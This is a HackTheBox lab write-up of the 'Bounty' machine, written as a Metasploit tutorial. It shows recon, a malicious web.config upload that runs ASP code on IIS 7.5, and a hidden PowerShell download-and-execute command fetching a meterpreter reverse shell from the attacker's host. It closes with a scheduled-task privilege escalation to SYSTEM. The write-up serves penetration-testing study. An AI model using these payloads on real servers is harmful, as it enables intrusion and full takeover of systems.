---
layout: post
title:  "HackTheBox: Bounty writeup - Metasploit basics"
date:   2018-10-28 22:00:00 +0100
comments: true
author: BoiteAKlou
categories:
- "Writeup"
- "Tutorial"
- "Pentest"
---


Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.

![Bounty box]({{ "/assets/2018-10-28/bounty-box.png" | absolute_url }} "Bounty Box")

This machine was pretty easy so I'm going to take this opportunity to explain you **the basics of the Metasploit framework**.
 <!--excerpt-->

# Table of Contents
{:.no_toc}

* TOC
{:toc}

Metasploit Introduction
-----------------------

Metasploit is an open-source pentesting framework distributed by **Rapid7**. It is extremly powerful and easy to use once you understand the logic.

You can use it for generating a bunch of payloads for every system or languages with **msfvenom**. It can also be run as an interactive console for connecting to the target system and exploiting it without leaving the console.

Metasploit relies on **modules**, which are specifically designed to exploit vulnerabilities. Each module has **a list of options** that you have to set in order to adapt the exploit to your specific environment. Then, you type "exploit" and **Metasploit does the job for you**.

This tool is **extremely powerful** when you want to exploit something quickly but it is **not the best approach** in a learning process because everything is done hunder the hood and you don't really know what happens on the system. To be used with caution... :wink:

## Initial Foothold

Back to our Bounty machine, we will perform the usual steps of **information gathering**.

### Port scanning

First, run a **nmap** scan with default scripts and version detection enabled. We will run a deeper scan if nothing is found.

```bash
# Nmap 7.70 scan initiated Sun Oct 21 13:58:33 2018 as: nmap -sC -sV -oA nmap/bounty 10.10.10.93
Nmap scan report for 10.10.10.93
Host is up (0.039s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 21 13:58:45 2018 -- 1 IP address (1 host up) scanned in 12.07 seconds
```

A single open port doesn't seem like much so we will run a deeper scan in background while we start investigating this website.

>We can notice that the webserver runs on IIS 7.5, which is completely outdated since the last version is 10.0.


### Web Application mapping

A good practice for saving time is to start running a directory listing tool such as **dirbuster** or **gobuster** before playing with the website's features manually. I prefer using **gobuster** since it's a bit faster.

```bash
boiteaklou@kali:~/Bounty/dirb$ gobuster -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -o gobuster/bounty
```

The scan will take a few minutes so we will check the results later.

Let's see what this website looks like...

![Bounty website]({{ "/assets/2018-10-28/website.png" | absolute_url }} "Bounty website")

A wonderful merlin drawing! It might be an hint.

The source code doesn't reveal anything more... Hopefully gobuster will fly to our rescue!

```bash
boiteaklou@kali:~/Bounty$ cat gobuster/bounty
/UploadedFiles (Status: 301)
/uploadedFiles (Status: 301)
/uploadedfiles (Status: 301)
```

The **/uploadedfiles/** directory seems very interesting but access is denied. However, an educated guess could tell that there should be an upload page somewhere...

We also know that the server is running on IIS so file extensions should be **asp** or **aspx**. We can refine our search by adding `-x .aspx` to gobuster, based on the assumptions we just made.

```bash
boiteaklou@kali:~/Bounty$ gobuster -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .aspx -o gobuster/bounty.aspx

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.93/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : aspx
[+] Timeout      : 10s
=====================================================
2018/10/27 22:43:30 Starting gobuster
=====================================================
/transfer.aspx (Status: 200)
```

Running it only a few seconds is enough to reveal **transfer.aspx**.

![Transfer.aspx]({{ "/assets/2018-10-28/transfer.png" | absolute_url }} "Transfer.aspx")

We found our entry point. Let's exploit it!

User Access
-----------

Googling "IIS 7.5 upload RCE" teaches us that **ASP** code can be executed by uploading a file called **web.config**.

We will test if the website is vulnerable by uploading the following file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Response.write("-"&"->")
Response.write(1+2)
Response.write("<!-"&"-")
%>
```
The ASP code is located at the very bottom of the file, between **<%** and **%>**. With this payload, the server should return "3" if it is vulnerable.

![File uploaded]({{ "/assets/2018-10-28/uploaded.png" | absolute_url }} "File uploaded")

Our file uploaded successfully so it means this file extension is allowed. We will suppose that files are not renamed during the upload so we will try to access it at **/uploadedfiles/web.config**.

![RCE vulnerability test]({{ "/assets/2018-10-28/vulnerable.png" | absolute_url }} "RCE vulnerability test")

It works! :fireworks: Now we should be able to execute commands on the web server.

### Meterpreter Shell

A reverse shell is generally what we are looking for when it comes to RCE. This time we will do better!

Metasploit can generate specific payloads but also setup a listener that will wait for the return of our reverse shell.
But why would we do that? Because it offers the possibility to execute metasploit exploit modules directly inside our remote session.
We can also juggle between several sessions, which can be pretty useful in some cases.

Here is the list of steps we will follow:
1. Generate our **meterpreter shell payload**.
2. Incorporate the payload into the **web.config** file.
3. Upload the web.config file.
4. Access the uploaded file in order to trigger the payload.
5. See what happens...

#### Meterpreter Shell Payload

First, we have to run Metasploit console with `msfconsole`. Then, we will use the **web delivery script** exploit module. A module is loaded with the keyword *"use"*, followed by the path of the module.

```bash
msf > use exploit/multi/script/web_delivery
msf exploit(multi/script/web_delivery) >
```

Then, you can type *"options"* to list all available parameters for this module:

```bash
msf exploit(multi/script/web_delivery) > options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Python

```

We will now specify several parameters in order to adapt the payload to our environment.

```bash
msf exploit(multi/script/web_delivery) > set SRVHOST 10.10.13.75  # Ip address of our machine
SRVHOST => 10.10.13.75
msf exploit(multi/script/web_delivery) > set TARGET 2  # TARGET 2 = powershell payload
TARGET => 2
msf exploit(multi/script/web_delivery) > set PAYLOAD windows/x64/meterpreter/reverse_tcp  # The payload we want to inject, a reverse shell
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) > set LHOST 10.10.13.75  # IP address for the reverse shell
LHOST => 10.10.13.75
msf exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.
msf exploit(multi/script/web_delivery) >
[*] Started reverse TCP handler on 10.10.13.75:4444
[*] Using URL: http://10.10.13.75:8080/moceswFJvKmkeD8
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.10.13.75:8080/moceswFJvKmkeD8');
```
Here is our payload! We must now integrate it into the **web.config** file. Do not close the msfconsole or hit CTR+C because Metasploit is currently listening and waiting for the payload to return.

#### Payload Incorporation

As you may have noticed, the payload is a **powershell script** (remember *set TARGET 2*) and not an **ASP** script.
However, we can call system functions in **ASP** so we will call **cmd.exe** and pass our payload as an argument.

This will result in the following **web.config** file:


```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.webServer>
<handlers accessPolicy="Read, Script, Write">
<add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
</handlers>
<security>
<requestFiltering>
<fileExtensions>
<remove fileExtension=".config" />
</fileExtensions>
<hiddenSegments>
<remove segment="web.config" />
</hiddenSegments>
</requestFiltering>
</security>
</system.webServer>
</configuration>
<%
on error resume next
Dim oS,output
Set oS = Server.CreateObject("WSCRIPT.SHELL")
output = oS.exec("cmd.exe > /c powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.13.75:8080/G783OPiDR3Em');").stdout.readall
Response.write("Powershell: " & vbCrLf & output & vbCrLf & vbCrLf)
%>
```

#### Upload web.config and access it

Now we have to upload our **web.config** file and visit the URL <http://10.10.10.93/uploadedfiles/web.config> to trigger the payload.

#### Back to msfconsole

We should see the following inside **msfconsole**:

```bash
[*] 10.10.10.93      web_delivery - Delivering Payload
[*] Sending stage (206403 bytes) to 10.10.10.93
[*] Meterpreter session 1 opened (10.10.13.75:4444 -> 10.10.10.93:49158) at 2018-10-28 19:23:06 +0100
```

A session has been opened on the remote target. We can list every opened sessions with `sessions -l`

```bash
msf exploit(multi/script/web_delivery) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x64/windows  BOUNTY\merlin @ BOUNTY  10.10.13.75:4444 -> 10.10.10.93:49158 (10.10.10.93)
```

As you can see, we are currently connected as **merlin** on the **BOUNTY** machine.

#### Gimme this user.txt

It's now time to retrieve the **user flag**.

Inside **msfconsole**, we can move into the session number 1 with `sessions -i 1` and we should arrive in a meterpreter shell.

```bash
msf exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

From here, we can use a few shell commands (the full list can be displayed by typing `help` or `?`) or type `shell` and dive into the classical Windows command prompt.

I suggest you to play around with the available commands from **meterpreter** and to get familiar with it.

The following command will give you the user flag:

```bash
meterpreter > cat C:/Users/merlin/Desktop/user.txt
e29ad8[...]2f44a2f
```

Privilege Escalation
--------------------

The privilege escalation was very straight-forward for this box, especially with meterpreter.

We will use a great module for lazy people, which is called: **local_exploit_suggester**.

### Local Exploit Suggester

Back in our metepreter session, we can call this module with the following command:

```bash
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.93 - Collecting local exploits for x64/windows...
[*] 10.10.10.93 - 10 exploit checks are being tried...
[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
```

So many options! :smiling_imp:

Let's try the first one...

### ms10_092_schelevator

We can background our current **meterpreter session** thanks to the command `background` so we go back to **msfconsole**.

Then, we can tell Metasploit to use **exploit/windows/local/ms10_092_schelevator**

```bash
msf exploit(multi/script/web_delivery) > use exploit/windows/local/ms10_092_schelevator
msf exploit(windows/local/ms10_092_schelevator) > options

Module options (exploit/windows/local/ms10_092_schelevator):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD                        no        Command to execute instead of a payload
   SESSION                    yes       The session to run this module on.
   TASKNAME                   no        A name for the created task (default random)


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista, 7, and 2008
```

We specify the **session number** to run this module on and the payload we want along with the local port to listen on for the reverse shell.

> We can't use the same port as our previous reverse shell or no session will be created.

```bash
msf exploit(windows/local/ms10_092_schelevator) > set SESSION 1   # The session number of our reverse shell (sessions -l to display them)
SESSION => 1
msf exploit(windows/local/ms10_092_schelevator) > set PAYLOAD windows/x64/meterpreter/reverse_tcp   # If the exploit works, we want a new reverse shell
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/ms10_092_schelevator) > set LPORT 4445  # The local port to listen on
LPORT => 4445
msf exploit(windows/local/ms10_092_schelevator) > set LHOST 10.10.13.75  # Ip address of our machine
LHOST => 10.10.13.75
```

Then, we can launch the exploit:

```bash
msf exploit(windows/local/ms10_092_schelevator) > exploit

[*] Started reverse TCP handler on 10.10.13.75:4445
[*] Preparing payload at C:\Windows\TEMP\FIydYyMVXS.exe
[*] Creating task: sMVszFGn5xTj
[*] SUCCESS: The scheduled task "sMVszFGn5xTj" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\sMVszFGn5xTj...
[*] Original CRC32: 0xa1c992cd
[*] Final CRC32: 0xa1c992cd
[*] Writing our modified content back...
[*] Validating task: sMVszFGn5xTj
[*]
[*] Folder: \
[*] TaskName                                 Next Run Time          Status         
[*] ======================================== ====================== ===============
[*] sMVszFGn5xTj                             11/1/2018 9:14:00 PM   Ready          
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "sMVszFGn5xTj" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "sMVszFGn5xTj" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (206403 bytes) to 10.10.10.93
[*] SUCCESS: Attempted to run the scheduled task "sMVszFGn5xTj".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.13.75:4445 -> 10.10.10.93:49162) at 2018-10-28 20:14:13 +0100
[*] SUCCESS: The scheduled task "sMVszFGn5xTj" was successfully deleted.
[*] SCHELEVATOR

meterpreter >
```

The `getuid` command will confirm that the exploit worked:

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We can now retrieve the **root flag** the same way we did for the user:

```bash
meterpreter > cat C:/Users/Administrator/Desktop/root.txt
c837f7b[...]f9d4f5ea
```

![Congratulations](https://media3.giphy.com/media/g9582DNuQppxC/giphy.gif?cid=3640f6095bd60b65474c4d7255c34b91)

Et voilà!

Final Words
-----------

I hope it gave you a brief overview of the power of **Metasploit Framework** and its ease of use. However, keep in mind that this tool will not help you to understand what is really happening on the machine.

Do not hesitate to ask your questions if something remains unclear for you :relaxed:.
<p id="signature">BoiteAKlou :hammer:</p>
